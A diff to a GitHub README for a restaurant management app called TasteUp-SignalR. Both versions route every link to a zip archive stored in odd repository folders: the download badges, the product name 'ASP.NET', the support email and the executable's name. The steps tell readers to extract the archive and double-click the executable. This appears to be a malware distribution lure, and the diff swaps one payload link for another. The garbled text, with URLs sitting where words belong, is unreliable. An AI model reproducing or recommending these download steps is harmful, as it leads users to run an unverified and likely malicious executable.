@@ -1,16 +1,16 @@
 # 🎉 TasteUp-SignalR - Your Easy Solution for Restaurant Management
 
 ## 🚀 Get Started Today!
-Welcome to TasteUp-SignalR, a user-friendly restaurant management system powered by https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip Core 6.0 and SignalR. This application uses QR codes to enable real-time communication, making management seamless and efficient.
+Welcome to TasteUp-SignalR, a user-friendly restaurant management system powered by https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip Core 6.0 and SignalR. This application uses QR codes to enable real-time communication, making management seamless and efficient.
 
-[![Download TasteUp-SignalR](https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip%20TasteUp--SignalR-Blue?style=for-the-badge)](https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip)
+[![Download TasteUp-SignalR](https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip%20TasteUp--SignalR-Blue?style=for-the-badge)](https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip)
 
 ## 📥 Download & Install
 To get started with TasteUp-SignalR, follow these steps:
 
 1. **Visit the Releases Page**
    Click on the link below to access the download options:
-   [Visit this page to download](https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip)
+   [Visit this page to download](https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip)
 
 2. **Choose the Latest Version**
    On the Releases page, look for the latest version listed. It will usually say something like "Latest Release". Click on it to expand the details.
@@ -22,7 +22,7 @@ To get started with TasteUp-SignalR, follow these steps:
    If you downloaded a `.zip` file, locate the downloaded file on your computer, right-click it, and select "Extract All". Follow the prompts to choose the extraction location. Once done, open the folder where you extracted the files.
 
 5. **Run the Application**
-   Inside the extracted folder, look for `https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip` or a similarly named executable file. Double-click on it to launch the application.
+   Inside the extracted folder, look for `https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip` or a similarly named executable file. Double-click on it to launch the application.
 
 ## 🖥️ System Requirements
 To ensure smooth operation, here are the recommended system requirements:
@@ -44,7 +44,7 @@ TasteUp-SignalR comes packed with essential features to help manage your restaur
 ## 🌐 Technologies Used
 TasteUp-SignalR uses several powerful technologies to function effectively:
 
-- **https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip Core**: A robust framework used for building web applications.
+- **https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip Core**: A robust framework used for building web applications.
 - **Entity Framework Core**: Helps in managing database interactions easily.
 - **SignalR**: This enables real-time web functionality for instant updates.
 - **SQL Server**: Used for data storage and management.
@@ -59,10 +59,10 @@ If you need assistance or more detailed guidance:
 ## 📞 Contact Us
 For queries and support, feel free to reach out to our team:
 
-- **Email**: https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip
+- **Email**: https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip
 - **GitHub Discussions**: Participate and ask questions in our repository.
 
 ## 🎉 Conclusion
 Thank you for choosing TasteUp-SignalR! Enjoy an efficient and modern approach to restaurant management. Follow the steps above to start your journey. 
 
-[![Download TasteUp-SignalR](https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip%20TasteUp--SignalR-Blue?style=for-the-badge)](https://raw.githubusercontent.com/DaviMaia10/TasteUp-SignalR/master/SignalRWebUI/wwwroot/404Page/Signal-Up-R-Taste-v3.7.zip)
+[![Download TasteUp-SignalR](https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip%20TasteUp--SignalR-Blue?style=for-the-badge)](https://github.com/DaviMaia10/TasteUp-SignalR/raw/refs/heads/master/TasteUp-Images/Up_Taste_R_Signal_2.9.zip)
